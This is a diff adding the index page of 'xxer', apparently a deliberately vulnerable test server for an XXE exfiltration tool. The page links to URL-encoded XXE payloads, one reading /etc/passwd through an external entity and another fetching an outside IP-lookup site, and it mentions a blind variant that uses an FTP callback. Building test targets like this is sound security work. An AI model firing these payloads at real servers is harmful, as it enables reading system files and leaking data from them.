@@ -1,0 +1,62 @@
+<html>
+    <head>
+        <title>xxer - Vulnerable Server</title>
+        <!--<meta name="viewport" content="width=device-width, initial-scale=1">-->
+        <link rel=stylesheet type=text/css href="https://cdn.jsdelivr.net/picnicss/6.3.2/picnic.min.css">
+        <style>
+            body {
+                max-width: 960px;
+                padding: 10px;
+                max-width: 960px;
+                width: 200%;
+                margin: 10px auto 10px;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>xxer Vulnerable Test Server</h1>
+        <article class="card">
+            <header>
+                <h2>Normal Test</h2>
+            </header>
+            <section>
+                A simple XXE vulnerability to that returns the full parsed XML docs given in the 'in' URL parameter.
+                <br />
+                <ul>
+                    <li>
+                        <a href="normal?in=<root>Test</root>">Base case</a>
+                    </li>
+                    <li>
+                        <a href="normal?in=%3C!DOCTYPE%20doc%20%5B%3C!ENTITY%20xxer%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%20%3E%20%5D%3E%3Cdoc%3E%26xxer%3B%3C%2Fdoc%3E">Get /etc/passwd</a>
+                    </li>
+                    <li>
+                        <a href="normal?in=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20test%20SYSTEM%20%22http%3A%2F%2Ficanhazip.com%22%3E%5D%3E%3Croot%3E%26test%3B%3C%2Froot%3E">Get http://canihazip.com</a>
+                    </li>
+                </ul>
+            </section>
+        </article>
+        <article class="card">
+            <header>
+                <h2>Blind Test</h2>
+            </header>
+            <section>
+                A more realistic XXE vulnerability that returns only a  status, not the full parsed document. Use the FTP callback to get results.
+                <br />
+                <ul>
+                    <li>
+                        <a href="blind?in=<root>Test</root>">Base case Valid</a>
+                    </li>
+                    <li>
+                        <a href="blind?in=<root>Test</root">Base case Invalid</a>
+                    </li>
+                    <li>
+                        <a href="">Get /etc/passwd</a>
+                    </li>
+                    <li>
+                        <a href="">Get http://canihazip.com</a>
+                    </li>
+                </ul>
+            </section>
+        </article>
+    </body>
+</html>
